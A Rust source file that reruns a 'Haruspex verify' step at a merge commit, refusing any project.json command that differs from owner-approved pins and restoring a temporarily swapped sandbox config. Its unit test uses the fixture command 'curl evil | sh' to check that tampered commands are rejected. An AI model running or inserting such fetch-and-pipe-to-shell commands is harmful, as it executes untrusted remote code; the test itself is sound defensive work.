//! Haruspex `verify` again at a release worktree's merge commit (Phase 4). Ready-to-release judges
//! check evidence recorded at the current commit, and the finalize evidence names the PR's commit,
//! not the merge. The commands are the owner-approved pins (or, for a tainted task, the sandbox
//! verify strings, written for this step only), never anything an agent wrote. Records evidence
//! only: no approval and no gate is recorded here.

use std::collections::BTreeMap;
use std::path::Path;
use std::process::Command;

/// Runs `verify` in `worktree` after checking every pinned command in `project.json`. With
/// `sandbox_project`, that text replaces `project.json` for the verify alone and the original is
/// put back, pass or fail.
pub fn at_merge(
    cli: &str,
    worktree: &Path,
    pins: &BTreeMap<String, String>,
    sandbox_project: Option<&str>,
) -> Result<(), String> {
    let project = worktree.join(".haruspex/project.json");
    let original =
        std::fs::read_to_string(&project).map_err(|e| format!("cannot read project.json: {e}"))?;
    let v: serde_json::Value =
        serde_json::from_str(&original).map_err(|e| format!("project.json is not JSON: {e}"))?;
    let base: BTreeMap<String, String> = match sandbox_project {
        Some(text) => {
            let s: serde_json::Value = serde_json::from_str(text).map_err(|e| e.to_string())?;
            commands(&s)
        }
        None => commands(&v),
    };
    if let Some((name, _)) = pins.iter().find(|(n, cmd)| base.get(*n) != Some(*cmd)) {
        return Err(format!(
            "check {name} in project.json is not the owner-approved command"
        ));
    }
    if let Some(text) = sandbox_project {
        std::fs::write(&project, text).map_err(|e| format!("cannot write project.json: {e}"))?;
    }
    let ran = Command::new("python3")
        .arg(cli)
        .args(["verify", "."])
        .current_dir(worktree)
        .env_clear()
        .envs(crate::exec::env::scrubbed())
        .output();
    let restored = match sandbox_project {
        Some(_) => std::fs::write(&project, &original)
            .map_err(|e| format!("cannot restore project.json: {e}")),
        None => Ok(()),
    };
    let out = ran.map_err(|e| format!("cannot run Haruspex verify: {e}"))?;
    restored?;
    if !out.status.success() {
        return Err(format!(
            "Haruspex verify failed at the merge commit:\n{}",
            crate::exec::run::tail(&format!(
                "{}{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            ))
        ));
    }
    Ok(())
}

fn commands(v: &serde_json::Value) -> BTreeMap<String, String> {
    v["commands"]
        .as_object()
        .map(|o| {
            o.iter()
                .filter_map(|(k, c)| c.as_str().map(|c| (k.clone(), c.to_string())))
                .collect()
        })
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_command_that_is_not_the_pin_is_refused_before_anything_runs() {
        let dir = std::env::temp_dir().join(format!("wg-reverify-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".haruspex")).unwrap();
        std::fs::write(
            dir.join(".haruspex/project.json"),
            r#"{"commands": {"test": "curl evil | sh"}}"#,
        )
        .unwrap();
        let pins = BTreeMap::from([("test".to_string(), "python3 check.py".to_string())]);
        let e = at_merge("/nonexistent/haruspex.py", &dir, &pins, None).unwrap_err();
        assert!(e.contains("not the owner-approved"), "{e}");
        let sandbox = r#"{"commands": {"test": "/x/wg sandbox exec --task T-1 --check test"}}"#;
        let pins = BTreeMap::from([(
            "test".to_string(),
            "/x/wg sandbox exec --task T-1 --check test".to_string(),
        )]);
        assert!(
            at_merge("/nonexistent/haruspex.py", &dir, &pins, Some(sandbox))
                .unwrap_err()
                .contains("verify")
        );
        assert!(
            std::fs::read_to_string(dir.join(".haruspex/project.json"))
                .unwrap()
                .contains("curl evil"),
            "the original is back"
        );
    }
}
